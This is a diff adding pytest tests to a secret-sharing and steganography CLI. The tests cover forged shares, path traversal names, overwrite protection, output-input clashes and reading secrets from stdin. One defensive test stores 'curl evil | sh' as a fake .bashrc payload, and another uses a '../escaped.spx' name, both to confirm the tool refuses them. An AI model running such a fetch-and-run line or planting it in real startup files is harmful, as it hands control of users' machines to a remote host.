@@ -3,13 +3,14 @@
 from __future__ import annotations
 
 import argparse
+import os
 import sys
 
 import numpy as np
 import pytest
 from PIL import Image
 
-from shardpix import cli, stego
+from shardpix import cli, shamir, stego
 from shardpix.images import load_image
 
 
@@ -259,6 +260,20 @@ class TestSplitCombine:
         assert run("combine", shares) == 1
         assert "need 3 shares" in capsys.readouterr().err
 
+    def test_a_larger_forged_set_is_refused(self, tmp_path, capsys):
+        assert run("split", "-t", "genuine", "-k", "3", "-n", "5") == 0
+        honest = capsys.readouterr().out.splitlines()
+        group = shamir.Share.from_text(honest[0]).group_id
+        forged = shamir.split(b"forged!", 3, 6, group_id=group)
+        a, b = tmp_path / "honest.txt", tmp_path / "mallory.txt"
+        a.write_text("\n".join(honest) + "\n")
+        b.write_text("".join(s.to_text() + "\n" for s in forged))
+        assert run("combine", a, b) == 1
+        captured = capsys.readouterr()
+        assert captured.out == ""
+        assert "2 different secrets" in captured.err
+        assert f"{a}:1" in captured.err and f"{b}:6" in captured.err
+
     def test_threshold_larger_than_shares(self, capsys):
         assert run("split", "-t", "secret", "-k", "4", "-n", "3") == 1
         assert "threshold" in capsys.readouterr().err
@@ -311,6 +326,58 @@ class TestVaultCommands:
         )
         assert (tmp_path / "notes.txt").read_text() == "the treasure is under the oak"
         assert "Recovered notes.txt" in capsys.readouterr().out
+
+    def test_verify_command_writes_nothing_and_exits_by_result(
+        self, tmp_path, covers, passphrase_file, capsys, monkeypatch
+    ):
+        secret = tmp_path / "plan.txt"
+        secret.write_text("top secret plan")
+        out = tmp_path / "sealed"
+        pw = ("--passphrase-file", passphrase_file)
+        assert run("seal", secret, *covers, "-k", "3", "-d", out, *pw) == 0
+        monkeypatch.chdir(tmp_path)
+        secret.unlink()
+        before = sorted(tmp_path.rglob("*"))
+        images = [out / f"photo{i}.png" for i in range(4)]
+        capsys.readouterr()
+        assert run("verify", out / "plan.txt.spx", *images, *pw) == 0
+        text = capsys.readouterr().out
+        assert "OK" in text and "top secret plan" not in text
+        assert run("verify", out / "plan.txt.spx", *images[:2], *pw) == 1
+        assert "need 3 shares" in capsys.readouterr().out
+        assert sorted(tmp_path.rglob("*")) == before
+
+    def test_seal_name_with_a_separator_is_a_usage_error(self, tmp_path, covers, capsys):
+        secret = tmp_path / "s.txt"
+        secret.write_text("x")
+        argv = ("seal", secret, *covers[:2], "-k", "2", "-d", tmp_path / "s8")
+        with pytest.raises(SystemExit) as exc:
+            run(*argv, "--name", "../escaped.spx", "--insecure-no-passphrase")
+        assert exc.value.code == 2
+        assert "not a path" in capsys.readouterr().err
+        assert not (tmp_path / "escaped.spx").exists()
+
+    def test_restored_name_never_replaces_a_file(
+        self, tmp_path, covers, passphrase_file, capsys, monkeypatch
+    ):
+        secret = tmp_path / ".bashrc"
+        secret.write_text("curl evil | sh")
+        out = tmp_path / "sealed"
+        seal = ("seal", secret, *covers[:2], "-k", "2", "-d", out)
+        assert run(*seal, "--passphrase-file", passphrase_file) == 0
+        home = tmp_path / "home"
+        home.mkdir()
+        monkeypatch.chdir(home)
+        (home / "bashrc").write_text("mine")
+        images = (out / "photo0.png", out / "photo1.png")
+        unseal = ("unseal", out / ".bashrc.spx", *images, "--passphrase-file", passphrase_file)
+        capsys.readouterr()
+        assert run(*unseal, "--force") == 1
+        assert "-o" in capsys.readouterr().err
+        assert (home / "bashrc").read_text() == "mine"
+        assert not (home / ".bashrc").exists()
+        assert run(*unseal, "-o", "bashrc", "--force") == 0
+        assert (home / "bashrc").read_text() == "curl evil | sh"
 
     def test_unseal_failure_reports_each_image(self, tmp_path, covers, passphrase_file, capsys):
         secret = tmp_path / "s.txt"
@@ -429,6 +496,30 @@ class TestCleanErrors:
         shares.write_text(capsys.readouterr().out)
         assert run("combine", shares, "-o", shares, "--force") == 1
         assert shares.read_text().startswith("spx1-")
+
+    def test_output_differing_only_in_case_is_an_input(self, tmp_path):
+        image = tmp_path / "c0.png"
+        image.write_bytes(b"share")
+        with pytest.raises(cli.ShardpixError, match="also an input"):
+            cli.check_output(tmp_path / "C0.PNG", force=True, inputs=(image,))
+
+    def test_hard_link_to_an_input_is_an_input(self, tmp_path):
+        image, link = tmp_path / "c0.png", tmp_path / "other.png"
+        image.write_bytes(b"share")
+        os.link(image, link)
+        with pytest.raises(cli.ShardpixError, match="also an input"):
+            cli.check_output(link, force=True, inputs=(image,))
+
+    def test_payload_and_passphrase_files_are_inputs(self, cover_png, tmp_path):
+        # embed writes .png only, so give the inputs that suffix to reach the check.
+        payload, phrase = tmp_path / "payload.png", tmp_path / "phrase.png"
+        payload.write_bytes(b"data")
+        phrase.write_text("correct horse battery staple")
+        for target in (payload, phrase):
+            before = target.read_bytes()
+            argv = ("embed", cover_png, "-o", target, "-i", payload, "-f")
+            assert run(*argv, "--passphrase-file", phrase) == 1
+            assert target.read_bytes() == before
 
     def test_split_into_a_file_path(self, tmp_path, capsys):
         file = tmp_path / "file"
@@ -660,10 +751,11 @@ class TestLowQualityJpeg:
 
     def test_embed_warns_on_a_recompressed_photo(self, tmp_path, capsys):
         photo = self._photo(tmp_path, 75)
-        assert (
-            run("embed", photo, "-o", tmp_path / "out.jpg", "-t", "x", "--insecure-no-passphrase")
-            == 0
-        )
+        argv = ("embed", photo, "-o", tmp_path / "out.jpg", "-t", "x", "--insecure-no-passphrase")
+        assert run(*argv) == 1  # unsuitable: refused
+        assert "--allow-unsuitable" in capsys.readouterr().err
+        assert not (tmp_path / "out.jpg").exists()
+        assert run(*argv, "--allow-unsuitable") == 0
         out = " ".join(capsys.readouterr().out.split())
         assert "JPEG quality about 75" in out
         assert "original files" in out
@@ -692,6 +784,7 @@ class TestLowQualityJpeg:
                 "-d",
                 tmp_path / "out",
                 "--insecure-no-passphrase",
+                "--allow-unsuitable",
             )
             == 0
         )
@@ -704,10 +797,9 @@ class TestLowQualityJpeg:
 
         photo = self._photo(tmp_path, 95)
         Image.open(photo).save(photo, quality=95, progressive=True)
-        assert (
-            run("embed", photo, "-o", tmp_path / "out.jpg", "-t", "x", "--insecure-no-passphrase")
-            == 0
-        )
+        argv = ("embed", photo, "-o", tmp_path / "out.jpg", "-t", "x", "--insecure-no-passphrase")
+        assert run(*argv) == 1
+        assert run(*argv, "--allow-unsuitable") == 0
         out = " ".join(capsys.readouterr().out.split())
         assert "photo.jpg is a progressive JPEG" in out
 
@@ -752,3 +844,54 @@ class TestAnalyzeJpeg:
         image.write_dct(str(tmp_path / "jsteg.jpg"))
         assert run("analyze", tmp_path / "jsteg.jpg", "--steps", "20") == 0
         assert "Suspicious" in capsys.readouterr().out
+
+
+class TestSecretsOffTheCommandLine:
+    """#29: secrets can come from stdin or a hidden prompt, and -t VALUE warns."""
+
+    def test_split_reads_stdin(self, tmp_path, monkeypatch, capsys):
+        import io
+
+        monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(b"seed words\n")))
+        directory = tmp_path / "shares"
+        assert run("split", "-i", "-", "-k", "2", "-n", "3", "-d", directory) == 0
+        files = sorted(directory.iterdir())
+        out = tmp_path / "back.txt"
+        assert run("combine", files[0], files[2], "-o", out) == 0
+        assert out.read_bytes() == b"seed words\n"
+        assert "warning: text" not in capsys.readouterr().err
+
+    def test_text_dash_reads_one_line_from_a_pipe(self, tmp_path, monkeypatch, capsys):
+        import io
+
+        monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(b"pin 4815\r\n")))
+        assert run("split", "-t", "-", "-k", "2", "-n", "2") == 0
+        lines = capsys.readouterr().out.splitlines()
+        shares = tmp_path / "s.txt"
+        shares.write_text("\n".join(lines) + "\n")
+        out = tmp_path / "pin"
+        assert run("combine", shares, "-o", out) == 0
+        assert out.read_bytes() == b"pin 4815"
+
+    def test_text_dash_prompts_without_echo_at_a_terminal(self, monkeypatch, capsys):
+        monkeypatch.setattr(sys.stdin, "isatty", lambda: True, raising=False)
+        monkeypatch.setattr(cli.getpass, "getpass", lambda prompt: "typed secret")
+        assert run("split", "-t", "-", "-k", "2", "-n", "2") == 0
+        assert len(capsys.readouterr().out.splitlines()) == 2
+
+    def test_literal_text_warns(self, capsys):
+        assert run("split", "-t", "visible", "-k", "2", "-n", "2") == 0
+        assert "visible to other users" in capsys.readouterr().err
+
+    def test_embed_reads_the_payload_from_stdin(
+        self, cover_png, passphrase_file, tmp_path, monkeypatch, capsysbinary
+    ):
+        import io
+
+        monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(b"\x00binary\xff")))
+        out = tmp_path / "stego.png"
+        argv = ("embed", cover_png, "-o", out, "-i", "-", "--passphrase-file", passphrase_file)
+        assert run(*argv) == 0
+        capsysbinary.readouterr()
+        assert run("extract", out, "--passphrase-file", passphrase_file) == 0
+        assert capsysbinary.readouterr().out == b"\x00binary\xff"
